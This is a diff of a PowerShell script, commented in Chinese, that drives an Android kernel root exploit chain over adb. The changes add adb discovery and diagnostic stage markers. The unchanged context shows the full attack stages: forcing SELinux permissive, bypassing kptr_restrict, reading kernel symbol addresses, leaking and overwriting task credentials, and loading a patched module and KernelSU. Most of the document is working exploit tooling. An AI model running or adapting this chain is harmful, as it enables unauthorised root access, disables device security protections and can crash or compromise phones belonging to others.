@@ -34,14 +34,10 @@ $scriptDir = Split-Path -Parent $MyInvocation.MyCommand.Path
 $pkgRoot   = Split-Path -Parent (Split-Path -Parent $scriptDir)   # package root (ghostlock-x200-root)
 if ($WorkDir) { $pkgRoot = $WorkDir }
 
-# ---- env detection: adb / python (override via -AdbPath / $env:ANDROID_ADB) ----
-$adb = $AdbPath
-if (-not $adb) { $adb = $env:ANDROID_ADB }
-if (-not $adb) { $adb = (Get-Command adb -ErrorAction SilentlyContinue).Source }
-if (-not $adb) {
-  $cand = @("C:\Program Files\platform-tools\adb.exe", "$env:LOCALAPPDATA\Android\Sdk\platform-tools\adb.exe")
-  $adb = $cand | Where-Object { Test-Path $_ } | Select-Object -First 1
-}
+# ---- adb: 显式 > 环境 > PATH > 常见位置 > 有界搜索 (共用 find_adb.ps1, 每个候选校验可用性) ----
+. (Join-Path $PSScriptRoot "find_adb.ps1")
+$adb = Get-AdbPath -Preferred $AdbPath -PackageRoot $pkgRoot -ExtraCandidates @(
+  (Join-Path $env:LOCALAPPDATA "GhostLock-X200\deps\platform-tools\adb.exe"))
 if (-not $adb) { Write-Output "ADB NOT FOUND: pass -AdbPath, set ANDROID_ADB, or install platform-tools"; exit 1 }
 $python = $env:PYTHON
 if (-not $python) { $python = (Get-Command python -ErrorAction SilentlyContinue).Source }
@@ -99,6 +95,8 @@ $dev_w2log  = "/data/local/tmp/w2h_$tag.log"
 $dev_cred   = "/data/local/tmp/w2cred_$tag.txt"
 $dev_proof  = "/data/local/tmp/rootproof_$tag.txt"
 $dev_dbg    = "/data/local/tmp/w2dbg_$tag.log"
+$dev_seq    = "/data/local/tmp/glt_seq_$tag.txt"    # 诊断: 阶段运行标记 (异常重启后仍可拉取)
+$dev_diagr  = "/data/local/tmp/diag_root_$tag"      # 诊断: root 级日志快照目录 (STAGE6 起)
 
 function Adb($a) { try { $psi = New-Object System.Diagnostics.ProcessStartInfo; $psi.FileName=$adb; $psi.Arguments="-s $serial $a"; $psi.UseShellExecute=$false; $psi.RedirectStandardOutput=$true; $psi.RedirectStandardError=$true; $p=[System.Diagnostics.Process]::Start($psi); $out=$p.StandardOutput.ReadToEnd(); $err=$p.StandardError.ReadToEnd(); $p.WaitForExit(); return ([string]($out+$err)).Trim() } catch { return "" } }
 function Shell($cmd) { return [string](Adb "shell $cmd") }
@@ -148,7 +146,14 @@ function Get-GLLock {
   # -> sh 把 0x... 当命令执行 -> "inaccessible or not found" -> glt 从未
   # 运行 -> STAGE5 永远 FAIL (脚本 0/3 失败 vs 手动 5/5 成功的唯一差异).
   Write-Host "GL_LOCK slot=$slot lock=$lock boot=$($bid.Substring(0,8))"
+  # 诊断: GL 槽位也落一条标记 (Write-Host 不进管道/日志, 只有 Mark 能进 glt_seq)
+  if ($bid.Length -ge 8) { Mark ("GL slot=$slot lock=$lock boot=" + $bid.Substring(0,8)) }
   return $lock
+}
+
+# ---- 诊断标记: 每阶段落一条记录 (写入 /data/local/tmp, 只读无关紧要; 异常重启后由 host 拉取) ----
+function Mark([string]$s) {
+  Shell ("echo '" + $s + " host=" + (Get-Date -Format "HH:mm:ss") + "' >> $dev_seq")
 }
 
 Write-Output "=== root_full_permissive_restore: permissive -> kptr(leaf-RED) -> CAPSROOT -> INSMOD permissive_restore+kernelsu -> 25s permissive ==="
@@ -168,8 +173,10 @@ Shell "chmod 755 $dev_w2"
 Shell "rm -f $dev_ksud"
 Adb "push $KSUD $dev_ksud" | Out-Null
 Shell "chmod 755 $dev_ksud"
+Mark "PUSH_TOOLS OK"
 
 # ---- STAGE1: permissive (W2 形态, 确定性) ----
+Mark "STAGE1 start"
 $perm_ok = $false
 for ($r=1; $r -le 5; $r++) {
   if (-not (Alive)) { Write-Output "STAGE1 ROUND $r DEVICE DOWN (panic?)"; exit 1 }
@@ -184,9 +191,11 @@ for ($r=1; $r -le 5; $r++) {
   Write-Output "STAGE1 ROUND ${r}: miss (safe), retry"
   Start-Sleep -Seconds 5
 }
-if (-not $perm_ok) { Write-Output "STAGE1 FAIL after 5 rounds"; exit 1 }
+if (-not $perm_ok) { Mark "STAGE1 FAIL"; Write-Output "STAGE1 FAIL after 5 rounds"; exit 1 }
+Mark "STAGE1 OK permissive"
 
 # ---- STAGE2: kptr (叶子 RED 形态, 确定性; GL_W0=kptr_restrict-8) ----
+Mark "STAGE2 start"
 $kptr_ok = $false
 for ($r=1; $r -le 5; $r++) {
   if (-not (Alive)) { Write-Output "STAGE2 ROUND $r DEVICE DOWN"; exit 1 }
@@ -201,9 +210,11 @@ for ($r=1; $r -le 5; $r++) {
   Write-Output "STAGE2 ROUND ${r}: miss, retry"
   Start-Sleep -Seconds 5
 }
-if (-not $kptr_ok) { Write-Output "STAGE2 FAIL (kptr != 0)"; exit 1 }
+if (-not $kptr_ok) { Mark "STAGE2 FAIL"; Write-Output "STAGE2 FAIL (kptr != 0)"; exit 1 }
+Mark "STAGE2 OK kptr"
 
 # ---- STAGE3: base 严格校验 (12:48 panic 根因修复) ----
+Mark "STAGE3 start"
 $text = Shell "grep -m1 ' _text$' /proc/kallsyms"
 if ($text -notmatch '^([0-9a-f]{16}) T _text$') { Write-Output "STAGE3 FAIL: no _text: '$text'"; exit 1 }
 $bstr = $matches[1]
@@ -212,6 +223,7 @@ if ($bstr -notmatch '^ffffff[cdef][0-9a-f]+$') { Write-Output "STAGE3 FAIL: base
 if ($bstr -notmatch '00000$') { Write-Output "STAGE3 FAIL: base not aligned: $bstr"; exit 1 }
 $base = [Convert]::ToUInt64("0x$bstr",16)
 Write-Output "STAGE3 OK: base=$bstr"
+Mark "STAGE3 OK base=$bstr"
 
 # ---- STAGE3.5a: dump kallsyms (当前 boot, STAGE3.4 输入) ----
 Adb "shell cat /proc/kallsyms" | Out-File -FilePath $KSYM_OUT -Encoding ascii
@@ -241,6 +253,7 @@ $w2_cand_min = ('0x{0:x}' -f ($pmb_v + 0x40000000))       # 排除低 1GB (内�
 $w2_direct_end = ('0x{0:x}' -f ($pmb_v + $mem_bytes))     # physmap 上限 = 真实内存
 Write-Output "设备内存: $([math]::Round($mem_kb/1024/1024,1))GB cand_min=$w2_cand_min direct_end=$w2_direct_end"
 Write-Output "STAGE3.4 OK: se=$se_p0 w0=$w0 cap_off=$cap_off capsym=$capsym w2_ips=$w2ips"
+Mark "STAGE3.4 OK"
 # ---- STAGE3.5: repatch permissive_restore (+kernelsu if provided) + push ----
 $KO_PATCHED = Join-Path $env:TEMP "kernelsu_patched_now.ko"
 $PERM_RESTORE_PATCHED = Join-Path $env:TEMP "permrestore_patched_now.ko"
@@ -260,6 +273,7 @@ if ($PERM_RESTORE_SRC) {
 } else {
   Write-Output "STAGE3.5 SKIP: -SkipPermissiveRestore (permissive_restore.ko not repatched/pushed)"
 }
+Mark "STAGE3.5 OK"
 
 # ---- STAGE4+5: w2host cred 泄漏 + CAPSROOT (参数化重试, 每轮新 cred+新槽位) ----
 # 根因: w2host perf 采样泄漏的 cred 偶发命中无效/已释放/非 child
@@ -272,9 +286,13 @@ if ($PERM_RESTORE_SRC) {
 #   adb shell 命令自身 -> 杀 shell -> w2host 从未启动. 且 pgrep -f 会匹配
 #   同命令里 $dev_w2 展开的 w2host_<tag> 字面 (命令自身 adb shell) -> 杀自己.
 #   修复: 杀进程与启动拆成两条独立 Shell 调用 (kill 命令只含 [t] 字面).
+# ---- 诊断标记: 记录 panic 前的最后动作 (写入 /data/local/tmp, 异常重启后仍存在) ----
+$bid0 = (Shell "cat /proc/sys/kernel/random/boot_id 2>/dev/null").Trim()
+Shell ("echo 'STAGE4/5 start: host=" + (Get-Date -Format "HH:mm:ss") + " boot_id=$bid0' > $dev_seq")
 $cred = ''
 for ($rr=1; $rr -le 3 -and -not $cred; $rr++) {
   Write-Output "STAGE4/5 ROUND $rr"
+  Shell ("echo 'ROUND $rr start' >> $dev_seq")
   if (-not (Alive)) { Write-Output "STAGE4 DEVICE DOWN"; exit 1 }
   Shell "pgrep -f 'w2hos[t]_' | xargs -r kill 2>/dev/null"
   Start-Sleep -Seconds 2
@@ -291,16 +309,18 @@ for ($rr=1; $rr -le 3 -and -not $cred; $rr++) {
     $t = ('0x{0:x}' -f ([Convert]::ToUInt64($c,16) + $cap_off))
     Shell "rm -f $dev_proof"
     $gl5 = Get-GLLock
-    Shell "echo 'GL_USE_SLIDE=1 GL_EVENT_SYNC=1 GL_KEEP_CHAIN=1 GL_NO_SCHED=1 GL_NO_LOCKPI=1 GL_TASK_W2=1 GL_LOCK=$gl5 GL_TARGET=$t GL_INIT_CRED=$capsym GL_FPAD=24 GL_PROBE=1 GL_ATTEMPTS=1 timeout 20 $dev_glt > /data/local/tmp/w.log 2>&1' > /data/local/tmp/run.sh; chmod 755 /data/local/tmp/run.sh; nohup sh /data/local/tmp/run.sh >/dev/null 2>&1 &"
+    # WRITE 标记与 run.sh 启动合并为同一条 Shell 调用 (不额外增加 adb 往返, 避免拉宽写窗口竞态)
+    Shell ("echo 'WRITE cand=$c gl5=$gl5 target=$t host=" + (Get-Date -Format "HH:mm:ss") + "' >> $dev_seq; echo 'GL_USE_SLIDE=1 GL_EVENT_SYNC=1 GL_KEEP_CHAIN=1 GL_NO_SCHED=1 GL_NO_LOCKPI=1 GL_TASK_W2=1 GL_LOCK=$gl5 GL_TARGET=$t GL_INIT_CRED=$capsym GL_FPAD=24 GL_PROBE=1 GL_ATTEMPTS=1 timeout 20 $dev_glt > /data/local/tmp/w.log 2>&1' > /data/local/tmp/run.sh; chmod 755 /data/local/tmp/run.sh; nohup sh /data/local/tmp/run.sh >/dev/null 2>&1 &")
     $rp = ''
     for ($i=0; $i -lt 12; $i++) { Start-Sleep -Seconds 2; if (-not (Alive)) { Write-Output "STAGE5 DEVICE DOWN (write panic)"; exit 1 }; $rp = Shell "cat $dev_proof 2>/dev/null"; if ($rp -match 'CAPSROOT') { Write-Output "STAGE5 OK: $rp"; $cred=$c; break } }
     if ($cred) { break }
     Write-Output "STAGE5 candidate $c miss, next"
   }
 }
-if (-not $cred) { Write-Output "STAGE5 FAIL: no CAPSROOT after 3 rounds"; exit 1 }
+if (-not $cred) { Shell ("echo 'STAGE5 FAIL after 3 rounds' >> $dev_seq"); Write-Output "STAGE5 FAIL: no CAPSROOT after 3 rounds"; exit 1 }
 Start-Sleep -Seconds 3
 if (-not (Alive)) { Write-Output "STAGE5 DEVICE DOWN after CAPSROOT"; exit 1 }
+Shell ("echo 'STAGE5 OK cred=$cred' >> $dev_seq")
 Write-Output "STAGE5 OK: CAPSROOT cred=$cred"
 
 # ---- STAGE6: rootcmd + INSMOD permissive_restore (init 清零 GL 宿主) -> INSMOD 官方 ko ----
@@ -311,6 +331,15 @@ Write-Output "STAGE5 OK: CAPSROOT cred=$cred"
 $id = Rootcmd "ID"
 Write-Output "rootcmd: $id"
 if ($id -notmatch 'uid=2000') { Write-Output "STAGE6 FAIL: rootcmd not online"; exit 1 }
+# ---- 诊断: root 级日志快照 (只读 + 快照式命令, 不读写流式节点, 不会引发 panic; 重启后由 host 拉取) ----
+Shell ("mkdir -p " + $dev_diagr)
+Rootcmd ("EXEC dmesg > $dev_diagr/dmesg.txt 2>&1") | Out-Null
+Rootcmd ("EXEC logcat -b kernel -d > $dev_diagr/logcat_kernel.txt 2>&1") | Out-Null
+Rootcmd ("EXEC cat /proc/modules > $dev_diagr/modules.txt 2>&1") | Out-Null
+Rootcmd ("EXEC getenforce > $dev_diagr/selinux.txt 2>&1") | Out-Null
+Rootcmd ("EXEC cat /proc/sys/kernel/kptr_restrict > $dev_diagr/kptr.txt 2>&1") | Out-Null
+Rootcmd ("EXEC cat /proc/uptime > $dev_diagr/uptime.txt 2>&1") | Out-Null
+Write-Output "diag: root 级日志快照 -> $dev_diagr"
 
 # 设备端模块名: v1.0 预编译资产内部 modinfo 名仍为 myroot (源自原资产字节,
 # 未重新编译); 用源码重建后为 permissive_restore. 两者都接受.
@@ -414,3 +443,4 @@ if ($KO_OFFICIAL) {
 } else {
   Write-Output "=== ALL STAGES PASS (no KSU): Permissive + $DEV_MOD Live + 网络通 ==="
 }
+Shell ("echo 'ALL STAGES PASS host=" + (Get-Date -Format "HH:mm:ss") + "' >> $dev_seq") | Out-Null
